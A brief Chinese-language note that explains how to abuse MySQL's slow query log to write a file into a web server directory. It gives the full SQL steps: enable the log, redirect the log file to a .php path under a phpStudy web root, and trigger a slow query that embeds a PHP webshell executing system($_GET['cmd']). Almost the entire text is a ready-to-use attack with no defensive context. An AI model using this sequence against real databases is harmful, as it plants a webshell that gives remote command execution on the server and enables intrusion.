# 原理

简单的说就是在mysql中，查询超过10秒的语句会被写到慢查询日志文件中去，一般默认是不开启的。利用这个特性就可以进行文件写入

# 利用

首先查询slow的配置。

```sql
show variables like '%slow_query_log%';
```

然后

```sql
set global slow_query_log=1;
```

然后设置log日志的位置，设置为web目录下

```sql
set global slow_query_log_file='C:\\phpStudy\\WWW\\cs.php';
```

触发慢查询日志

```sql
select  '<?php echo system($_GET["cmd"]);?>' or sleep(11);
```